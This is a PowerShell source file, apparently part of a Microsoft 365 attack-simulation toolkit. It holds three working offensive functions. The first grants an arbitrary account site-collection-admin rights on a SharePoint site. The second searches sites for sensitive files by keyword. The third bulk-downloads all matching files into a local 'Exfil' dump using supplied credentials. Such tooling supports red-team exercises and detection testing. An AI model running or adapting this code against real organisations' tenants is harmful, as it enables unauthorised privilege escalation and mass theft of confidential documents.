#Sharepoint

function GrantAccessToSharpointSite {

    EnterAccount ("`nEnter an account to give access to (user@org.com)")
    $target_account = $global:account_username

    EnterSharepointSite ("Enter a SharePoint site name to gain access to")
    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Grant access to site
    Write-Host "`nAttempting to grant access to SharePoint site..." -ForegroundColor Gray
    try {
        Set-SPOUser -Site $target_site_url -LoginName $target_account -IsSiteCollectionAdmin $true -ErrorAction Stop
        Start-Sleep -Seconds 5
        Write-Host "`n[Success] Granted '$target_account' access to SharePoint site: $target_site_name" -ForegroundColor Yellow
    }
    catch {
        Write-Host "`n[Error] Failed to get access to SharePoint site: $target_site_name" -ForegroundColor Red
    }
 }

 function SearchSharepointSite{
    EnterSharepointSite ("Enter a SharePoint site name to search in")
    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Select a credential to use
    UseCredential
    $target_current_username = $global:current_username
    $current_secure_pass = ConvertTo-SecureString $global:current_password -AsPlainText -Force 
    $target_current_credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_current_username, $current_secure_pass)

    #Connect to sharepoint site
    ConnectSharepointSite $target_site_url $target_current_credential
    if ($global:sp_site_connected -eq $true){

        #Find a file or all files
        while ($true) {
            $keyword = Read-Host -Prompt "`nEnter a keyword to search matching files (Eg: secret or exit search)"
            
            if ($keyword -in "",$null) {
                Write-Host "`n[Input Error] Search term cannot be blank. I am sure you can think of an interesting file you would like to look for`n" -ForegroundColor Red
                Write-Host "[Tip] You can type 'exit search' in search term to exit this module" -ForegroundColor Gray
            }

            if ($keyword -eq "exit search") {
                Write-Host "`nExiting file search" -ForegroundColor Gray
                break
            }

            if ($keyword -ne ""){
                #Searching for file
                Write-Host "`nSearching for files matching the term: $keyword" -ForegroundColor Gray
                
                $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
                $search_result = Find-PnPFile -Match *$keyword* 
                
                if ($null -eq $search_result) {
                    Write-Host "`nNo results found matching the search" -ForegroundColor Red
                }
                elseif ($search_result.Count -gt 20){
                    Write-Host "`nSearch returned $($search_result.Count) matches. Returning first 10 matches. Full results are stored in the /Outputs directory" -ForegroundColor Gray
                    $search_result | Select-Object -First 10
                    $search_result | Out-File -FilePath .\Outputs\SharePoint_File_Search_Report_$current_time.txt -Append
                    Write-Host "`n[Success] Search completed!" -ForegroundColor Yellow
                    Write-Host "`n[Tip] You can enter 'exit search' to go back to menu" -ForegroundColor Gray
                }  
                else{
                    $search_result
                }
            } 
        }
    }
}

 function ExfilDataFromSharepointSite{
    #Select a target site
    EnterSharepointSite ("Enter a SharePoint site name to search in")
    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Select a credential to use
    UseCredential
    $target_current_username = $global:current_username
    $current_secure_pass = ConvertTo-SecureString $global:current_password -AsPlainText -Force 
    $target_current_credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_current_username, $current_secure_pass)

    #Connect to sharepoint site
    ConnectSharepointSite $target_site_url $target_current_credential
    
    if ($global:sp_site_connected -eq $true){
        $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
        $current_dump_folder_name = "MAAD_SP_Exfil_"+$current_time
        #Create a download folder
        if ((Test-Path -Path ".\Outputs\SharepointDump\$current_dump_folder_name") -eq $false){
            Write-Host "`nCreating directory 'SharePointDump\$current_dump_folder_name' in /Outputs to dump all files..." -ForegroundColor Gray
            New-Item -ItemType Directory -Force -Path .\Outputs\SharepointDump\$current_dump_folder_name | Out-Null
        }

        #Check user preference
        Write-Host "`n[Tip] To exfil specific file types enter the file extension in search like 'docx', 'pdf', 'DWG'" -ForegroundColor DarkGray
        $user_search_term = Read-Host -Prompt "`nEnter a term or file extension -OR- leave blank and hit 'Enter' if you would like to exfil all files"

        Write-Host "`nInitiating exfil from SharePoint..." -ForegroundColor Gray
        
        
        if ($user_search_term -in $null,""){
            Write-Host "`n1. Traversing through SharePoint to find all files..." -ForegroundColor Gray
            $all_files = Find-PnPFile -Match *
        }
        else {
            Write-Host "`n1. Traversing through SharePoint to find files matching the term..." -ForegroundColor Gray
            $all_files = Find-PnPFile -Match *$user_search_term*
        }

        Write-Host "2. Found $($all_files.Length) total files" -ForegroundColor Gray
        Write-Host "3. Preparing to dump all found files to local directory..." -ForegroundColor Gray
        Write-Host "4. Resolving relative download paths for each file..." -ForegroundColor Gray
        Write-Host "5. Exfil in progress..." -ForegroundColor Gray
        Write-Progress -Activity "Exfiltrating data..." -Status "0% complete:" -PercentComplete 0;
        
        $counter = 0
        #Download all files
        foreach ($file in $all_files){ 
            #Resolve relative download path
            $file_sp_path = $file.Path.Identity.Split(":")[-1] 

            Get-PnPFile -Url $file_sp_path -Path ./Outputs/SharepointDump/$current_dump_folder_name -AsFile -Filename $file_sp_path.Replace("/","_")
            $counter++
            Write-Progress -Activity "SharePoint exfiltration in progress" -Status "$([math]::Round($counter/$all_files.Length * 100))% complete:" -PercentComplete ([math]::Round($counter/$all_files.Length * 100));
        }

        Write-Host "`nSharePoint exfil details:" -ForegroundColor Gray
        Write-Host "Total files exfiltrated: $counter/$($all_files.Length)"  -ForegroundColor Gray
        Write-Host "Total data exfiltrated: $download_size"  -ForegroundColor Gray
        Write-Host "`n[Success] SharePoint data exfiltrated!" -ForegroundColor Yellow
    }
}

